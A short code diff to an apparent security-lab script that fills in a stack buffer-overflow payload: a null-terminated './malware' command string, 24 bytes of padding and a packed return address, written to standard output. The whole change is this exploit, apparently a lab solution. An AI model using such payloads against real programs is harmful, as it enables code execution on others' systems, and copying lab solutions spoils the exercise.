@@ -4,7 +4,9 @@
 TODO: replace the empty payload with the bytes required by the lab.
 """
 import sys
-
-payload = b""
-
+import struct
+command = b'./malware\x00'
+padding = b'A' * (24 - len(command))
+target = struct.pack('<Q', 0x401a6b)
+payload = command + padding + target
 sys.stdout.buffer.write(payload)
